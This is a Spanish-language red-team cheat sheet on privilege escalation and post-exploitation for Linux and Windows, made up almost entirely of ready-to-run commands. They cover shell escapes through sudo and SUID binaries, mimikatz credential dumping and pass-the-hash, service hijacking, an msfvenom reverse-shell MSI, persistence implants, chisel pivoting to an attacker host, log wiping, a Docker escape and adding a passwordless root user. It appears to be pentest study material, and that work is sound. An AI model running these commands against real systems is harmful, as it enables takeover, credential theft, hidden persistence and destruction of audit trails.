# Red Team - Fase 3: Privilege Escalation & Post-Exploitation

## 1. Linux Privilege Escalation

### 1.1 Concepto
Moverse de usuario limitado a root/admin.

### 1.2 Enumeration

```bash
# Info del sistema
uname -a
cat /etc/lsb-release

# Usuario actual
id
whoami
_groups

# Permisos sudo
sudo -l

# Procesos
ps aux
ps -ef

# Servicios
systemctl list-units --type=service
service --status-all
```

### 1.3 GTFOBins

Website: https://gtfobins.github.io/

Comandos útiles:
```bash
# find con SUID
find . -exec /bin/sh \; -quit

# vim con sudo
sudo vim -c '!sh'

# less con sudo
sudo less /etc/passwd
!sh

# awk con sudo
sudo awk 'BEGIN {system("/bin/sh")}'

# python con sudo
sudo python -c 'import os; os.system("/bin/sh")'
```

### 1.4 SUID Binaries

```bash
# Buscar SUID
find / -perm -4000 2>/dev/null

# Verificar cada binario
ls -l /bin/su
ls -l /usr/bin/sudo

# Explorar
strings /usr/bin/vulnerable
```

### 1.5 Cronjobs

```bash
# Ver cronjobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# Ver scripts
cat /etc/cron.daily/*
```

### 1.6 capabilities

```bash
# Ver capabilities
getcap -r / 2>/dev/null

# Si hay python con caps
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 1.7 sudo misconfigurations

```bash
# Permisos amplios
sudo -l

# Si tiene vim/less/nano
sudo vim
:silent !bash
```

### 1.8 Kernel Exploits

```bash
# Versión kernel
uname -r

# Buscar exploit
searchsploit "kernel 5.4" "Linux"
```

---

## 2. Windows Privilege Escalation

### 2.1 Enumeration

```cmd
# Sistema
systeminfo

# Usuario
whoami /all

# Privilegios
whoami /priv

# Programas instalados
wmic product get name,version

# Servicios
sc query

# Puertos
netstat -ano
```

### 2.2 winPEAS

```bash
# Descargar
wget https://github.com/carlospolop/winPEAS/releases

# Ejecutar
winpeas.exe

# Categorías
winpeas.exe fast
winpeas.exe silent
```

### 2.3 mimikatz

```cmd
# Dump creds
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Pass the Hash
sekurlsa::pth /user:admin /domain:WORKGROUP /ntlm:hash
```

### 2.4 Service Exploits

```cmd
# Buscar binarios con path hijacking
sc qc serviceName

# Modificar servicio
sc config serviceName binPath= "C:\shell.exe"
sc start serviceName
```

### 2.5 AlwaysInstallElevated

```cmd
# Check registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Installer"

# Crear MSI malicious
msfvenom -p windows/meterpreter/reverse_tcp.msi -f msi > shell.msi
```

---

## 3. Post-Exploitation

### 3.1 Persistencia

#### Linux
```bash
# Cronjob
(crontab -l 2>/dev/null; echo "@reboot /tmp/shell") | crontab -

# .bashrc
echo "/tmp/shell" >> ~/.bashrc

# systemd
cat > /etc/systemd/system/shell.service <<EOF
[Unit]
Description=Shell

[Service]
Type=simple
ExecStart=/tmp/shell

[Install]
WantedBy=multi-user.target
EOF
```

#### Windows
```cmd
# Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Shell /t REG_SZ /d "C:\shell.exe"

# Scheduled Task
schtasks /create /tn "Shell" /tr C:\shell.exe /sc onlogon
```

### 3.2 Pivoting

```bash
# Proxy socks con chisel
chisel server --port 8080
chisel client http://atacante:8080 socks

# SSH pivoting
ssh -D 1080 victim@192.168.1.77

# Meterpreter routing
run post/multi/manage/autoroute
```

### 3.3 Recolección de Información

```bash
# Archivos sensibles
find / -name "*.txt" -o -name "*.conf" 2>/dev/null | head -20

# Historial
cat ~/.bash_history

# Creds en memoria
strings /dev/mem | grep -i password
```

### 3.4 Limpieza

```bash
# Borrar logs
echo > /var/log/auth.log
echo > /var/log/syslog

# Borrar historial
history -c
rm -rf ~/.bash_history
```

---

## 4. Técnicas Avanzadas

### 4.1 Container Escaping

```bash
# Escaping Docker
docker run -v /:/host alpine chroot /host

# Capability abuse
docker run --cap-add=SYS_ADMIN alpine mount /dev/sda1 /mnt
```

### 4.2 Writable /etc/passwd

```bash
# Si /etc/passwd es writable
echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

### 4.3 LD_PRELOAD

```bash
# Si tenemosLD_PRELOAD
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c
LD_PRELOAD=/tmp/preload.so vulnerable_binary
```

---

## Resumen

| Técnica | Requisito |
|---------|----------|
| sudo -l | Permisos sudo |
| SUID | Binario con SUID |
| Cron | Script world-writable |
| Kernel | Exploit público |
| Capabilities | capability específica |
| Container | Privilegios elevados |

---

## Recursos

- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings
- HackTricks Windows Privesc
-Payloads for container escaping